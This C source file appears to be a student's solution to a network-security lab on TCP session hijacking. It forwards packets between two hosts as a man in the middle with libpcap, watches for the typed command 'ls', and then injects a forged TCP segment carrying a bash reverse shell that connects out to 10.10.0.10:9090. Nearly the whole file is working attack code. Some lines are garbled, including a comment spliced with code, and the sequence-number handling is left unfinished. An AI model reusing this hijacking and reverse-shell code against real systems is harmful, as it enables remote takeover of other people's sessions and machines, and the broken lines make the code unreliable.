// SPDX-License-Identifier: Unlicense

#include <arpa/inet.h>
#include <linux/tcp.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include <string.h>

#include "log.h"
#include "tcp_util.h"
#include "util.h"

// These addresses are now hardcoded into the docker-compose file.
#define HOST_A_MAC "0a:1a:5d:92:0a:20"
#define HOST_B_MAC "7e:8f:c5:5e:f3:09"
#define MSG_BUFFER_SIZE 1024

char *trigger_cmd = "ls";
char *injected_cmd = "\r\n/bin/bash -i > /dev/tcp/10.10.0.10/9090 0<&1 2<&1\r\n";
char msg[MSG_BUFFER_SIZE];
int cur_idx = 0;

static struct in_addr host_a_addr;
static struct in_addr host_b_addr;

static void
print_tcp_packet_info(const u_char *pkt, struct iphdr *iphdr, struct tcphdr *tcphdr, unsigned len)
{
  uint16_t tcp_hdr_len = tcphdr->doff * 4;
  uint16_t ip_hdr_len = iphdr->ihl * 4;
  uint16_t ip_total_len = ntohs(iphdr->tot_len);
  int data_len = ip_total_len - ip_hdr_len - tcp_hdr_len;
  
  char *data = (char *)tcphdr + tcp_hdr_len;
  
  // Print source and destination
  struct in_addr src, dst;
  src.s_addr = iphdr->saddr;
  dst.s_addr = iphdr->daddr;
  
  printf("\n========== TCP PACKET INFO ==========\n");
  printf("Source IP: %s:%d\n", ip_to_str(&src.s_addr), ntohs(tcphdr->source));
  printf("Dest IP:   %s:%d\n", ip_to_str(&dst.s_addr), ntohs(tcphdr->dest));
  
  // Print TCP flags
  printf("Flags: ");
  if (tcphdr->syn) printf("SYN ");
  if (tcphdr->ack) printf("ACK ");
  if (tcphdr->psh) printf("PSH ");
  if (tcphdr->fin) printf("FIN ");
  if (tcphdr->rst) printf("RST ");
  printf("\n");
  
  // Print sequence and acknowledgment numbers
  printf("Seq: %u, Ack: %u\n", ntohl(tcphdr->seq), ntohl(tcphdr->ack_seq));
  
  // Print packet lengths
  printf("Total packet len: %u bytes\n", len);
  printf("IP total len: %u bytes\n", ip_total_len);
  printf("TCP data len: %d bytes\n", data_len);
  
  // Print data payload
  if (data_len > 0) {
    printf("Data (hex): ");
    for (int i = 0; i < data_len; i++) {
      printf("%02x ", (unsigned char)data[i]);
    }
    printf("\n");
    
    printf("Data (ascii): ");
    for (int i = 0; i < data_len; i++) {
      char c = data[i];
      if (c >= 32 && c <= 126) {
        printf("%c", c);
      } else if (c == '\r') {
        printf("\\r");
      } else if (c == '\n') {
        printf("\\n");
      } else if (c == '\t') {
        printf("\\t");
      } else {
        printf(".");
      }
    }
    printf("\n");
  } else {
    printf("No data payload\n");
  }
  
  printf("=====================================\n\n");
}

static int
is_triggered(struct iphdr *iphdr, struct tcphdr *tcphdr)
{
  char *data = (char *)tcphdr;
  uint16_t tcp_hdr_len = tcphdr->doff * 4;
  data = data + tcp_hdr_len;
  uint16_t ip_total_len = ntohs(iphdr->tot_len); // Total IP packet length
  uint16_t ip_hdr_len = iphdr->ihl * 4;          // IP header length
  int data_len = ip_total_len - ip_hdr_len - tcp_hdr_len;

  if (!(tcphdr->ack && tcphdr->psh) || (iphdr->saddr != host_a_addr.s_addr) ||
      (cur_idx == MSG_BUFFER_SIZE) || data_len != 1) {
    return 0;
  }

  if (*data == '\r') {
    msg[cur_idx] = '\0';
    printf("final message = %s\n", msg);
    cur_idx = 0;
    return !strcmp(trigger_cmd, msg);
  }

  msg[cur_idx] = *data;
  cur_idx++;

  return 0;
}

static u_char *
hijack_tcp_connect(const u_char *pkt, struct iphdr *iphdr, struct tcphdr *tchdr,
                   const char *cmd, size_t *len)
{
  int data_len = strlen(cmd);
  uint16_t tcp_hdr_len = tchdr->doff * 4;

	print_tcp_packet_info(pkt, iphdr, tchdr, *len);

  print_log("Running the TCP session hijacking code...\n");
  // TODO
  // =====
  //  Add your implementation for the TCP session hijacking here...
  //
  //  1. Compute the length of your modified packet
  int pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) +
                tcp_hdr_len + data_len;

  //  2. Allocate space for that packet using malloc
  u_char *mod_pkt = malloc(pkt_len);
  if (mod_pkt == 0)
    return 0;

  //  3. Copy over the pkt into your return packet
  //     WARNING:
  //     return packet is longer than packet, you need to grab the
  //     original packet length to know how much to copy. OR copy the headers
  //     one by one.
  memcpy(mod_pkt, pkt, *len);

  //  4. Grab new reference to the ip and tcp headers.
  // struct ether_header *eth = (struct ether_header *)mod_pkt;
  struct iphdr *ip = (struct iphdr *)(mod_pkt + sizeof(struct ether_header));
  struct tcphdr *tcp = (struct tcphdr *)(mod_pkt + sizeof(struct ether_header) +
                                         sizeof(struct iphdr));
  u_char *data_ptr = (u_char *)tcp + tcp_hdr_len;

  //  5. Set the new sequence number (we want this to be in the future).
  // tcp->seq = htonl(ntohl(tchdr->seq) + data_len);
  tcp->seq = (tchdr->seq);

  tcp->ack = 1;
  tcp->psh = 1;

  //  6. Write the data into your packet. What should the command start and end
  //  with?
  memcpy(data_ptr, cmd, data_len);

  //  7. Update the packet's total length tot_len field given your changes.
  ip->tot_len = htons(sizeof(struct iphdr) + tcp_hdr_len + data_len);

  //  8. Compute checksums over ip and tcp headers.
  tcp->check = 0;
  ip->check = 0;

  ip->check = chksum((uint16_t *)ip, sizeof(struct iphdr));
  tcp->check = compute_tcp_checksum(tcp, ip);

  //  9. Set *len to the new pa	tcp->seq = htonl(ntohl(tchdr->seq) + data_len);
  *len = pkt_len;
	print_tcp_packet_info(pkt, ip, tcp, *len);
  return mod_pkt;
}

void
parse_tcp(const u_char *pkt, const char *my_mac_addr, pcap_t *handle,
          unsigned len)
{
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct ether_header *eth;
  struct ether_addr *eth_addr;

  // new packet to send out
  size_t nlen = 0;
  u_char *npkt = 0;

  eth = (struct ether_header *)pkt;
  ip = (struct iphdr *)(pkt + sizeof *eth);
  tcp = (struct tcphdr *)(pkt + sizeof *eth + sizeof *ip);

  inet_aton("10.10.0.4", &host_a_addr);
  inet_aton("10.10.0.5", &host_b_addr);

  // TODO:
  //  Remove these lines, they're only here to silence the compiler.
  (void)tcp;
  (void)eth_addr;

  // TODO:
  //=====
  //   Complete this function to parse a TCP packet and then modify its content
  //   to replace everything with a letter of your choice (or choose something
  //   more fun)!

  // 1. You will need to fix the Ethernet header's source and destination MAC
  //    addresses, depending on where it's coming from.
  //
  //    _Hint_: Recall that you are posing as both hostA and hostB.
  //
  //    COPY THIS CODE OVER FROM LAB 07
  //
  if (ip->saddr == host_a_addr.s_addr) {
    // packet coming from host a to host b, how should it reach b?
    eth_addr = ether_aton(HOST_B_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet,
           sizeof eth->ether_dhost);

    eth_addr = ether_aton(my_mac_addr);
    memcpy(eth->ether_shost, eth_addr->ether_addr_octet,
           sizeof eth->ether_shost);
  } else if (ip->saddr == host_b_addr.s_addr) {
    // packet coming from host b to host a, how should it reach a?
    eth_addr = ether_aton(HOST_A_MAC);
    memcpy(eth->ether_dhost, eth_addr->ether_addr_octet,
           sizeof eth->ether_dhost);

    eth_addr = ether_aton(my_mac_addr);
    memcpy(eth->ether_shost, eth_addr->ether_addr_octet,
           sizeof eth->ether_shost);
  }

  print_log("Received tcp packet! Forwarding to victim...\n");

  // 2. Check if the packet contains the trigger.
  //    NOTE: is_triggered might need to work across packets.
  if (is_triggered(ip, tcp)) {
    printf("triggered!!!\n");
    nlen = len;
    npkt = hijack_tcp_connect(pkt, ip, tcp, injected_cmd, &nlen);
    // memset(msg, 0, MSG_BUFFER_SIZE);

		// for (int i = 0; i < nlen; i++) {
		// 	
		// }

    int nrc = pcap_inject(handle, npkt, nlen);
    free(npkt);
    if (nrc == PCAP_ERROR_NOT_ACTIVATED) {
      print_err("Pcap was not actived!\n");
      exit(EXIT_FAILURE);
    } else if (nrc == PCAP_ERROR) {
      print_err("Pcap error: %s\n", pcap_geterr(handle));
      exit(EXIT_FAILURE);
    }
  }

  // 3. Compute checksum for both the TCP header and the IP header.
  //    COPY THIS OVER FROM LAB 07
  tcp->check = 0;
  tcp->check = compute_tcp_checksum(tcp, ip);

  // 4. Send the packet, this is the same code from previous labs.
  int rc = pcap_inject(handle, pkt, len);
  if (rc == PCAP_ERROR_NOT_ACTIVATED) {
    print_err("Pcap was not actived!\n");
    exit(EXIT_FAILURE);
  } else if (rc == PCAP_ERROR) {
    print_err("Pcap error: %s\n", pcap_geterr(handle));
    exit(EXIT_FAILURE);
  }
}

uint16_t
compute_tcp_checksum(struct tcphdr *tcp, struct iphdr *ip)
{
  unsigned long cksum = 0;
  uint16_t tcplen = ntohs(ip->tot_len) - (ip->ihl * 4);
  struct pseudo_tcp_hdr pseudohdr;
  uint16_t *hdr;
  uint32_t len;

  // make sure this is zero.
  tcp->check = 0;

  // fill up the pseudo header
  pseudohdr.saddr = ip->saddr;
  pseudohdr.daddr = ip->daddr;
  pseudohdr.zero = 0;
  pseudohdr.ptcl = ip->protocol;
  pseudohdr.tcp_len = htons(tcplen);

  // start over the pseudoheader
  len = sizeof pseudohdr;
  hdr = (uint16_t *)(&pseudohdr);
  while (len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  // pseudo header is always 96 bits or 24 bytes, which means len is 0 now.
  len = tcplen;
  hdr = (uint16_t *)tcp;
  while (len > 1) {
    cksum += *hdr++;
    len -= sizeof(uint16_t);
  }

  if (len)
    cksum += *(u_char *)hdr;

  cksum = (cksum >> 16) + (cksum & 0xffff);
  cksum += (cksum >> 16);

  return (uint16_t)~cksum;
}
